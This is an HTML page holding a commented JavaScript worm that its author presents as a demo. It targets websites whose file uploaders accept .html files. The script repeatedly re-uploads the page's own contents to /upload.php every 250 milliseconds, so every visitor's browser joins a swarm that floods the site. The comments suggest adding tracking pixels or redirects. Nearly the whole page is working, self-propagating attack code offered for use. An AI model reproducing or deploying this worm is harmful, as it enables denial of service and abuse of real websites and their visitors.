<!doctype html>
<html>
    <head>
        <title> Hacked! </title>
    </head>
    <body>

        <h3> 
            Landon Powell's wonderful worm for 
            file uploaders that don't blacklist
            .html, .htm, and other file extensions.
            <hr>
            Because of this, SoP can be bypassed.
            <hr>
            If you wanted to add some fun, you could 
            throw a tracking pixel in here, but I'm 
            trying to keep this demo self-contained.
            <hr>
            This file is heavily commented. Simply
            press ctrl-u to learn how it works.
            <hr>
            Overview: Webbrowsers accesing the file
            through a compromised website become a
            botnet that spams the site with uploads.
        </h3>

        <script type="text/javascript">

// We're going to use a function since we're going to use setInterval to loop what we're doing.
function uploadYourself() {
    // We just start by creating a form that exists within JS.
    var form = new FormData();

    // Then, we create a new file. 
    var file = new File(
        [document.documentElement.innerHTML], // The file's content is the same as our webpage's. 
        (Math.random() + ".htm").substr(2)              // A random '.htm' filename is generated.
    );

    // Toss that file onto the form.
    // I assume the 'name=' attribute for the uploaded file is 'file' for this.
    form.append("file", file);
    // You might have to toss some more attributes onto the form to make the upload work. 

    // Next up, we just send the form through a post request. That's all, folks!
    var request = new XMLHttpRequest();
    // This script assumes the file upload script is at 'http://dumbass.com/upload.php'.
    // I assume this because only a PHP user would fuck up this badly. Signed, a former PHP user.
    request.open("POST", "/upload.php");
    request.send(form);

    // Just for the sake of knowing something is happening, I log the file name to the console.
    console.log(file.name);
}

// Adjust '250' in case the server detects spam.
setInterval(uploadYourself, 250);

// Just to spice things up, we could redirect the user to the file they made.
// location = "/files/" + x.name;

        </script>
    </body>
</html>
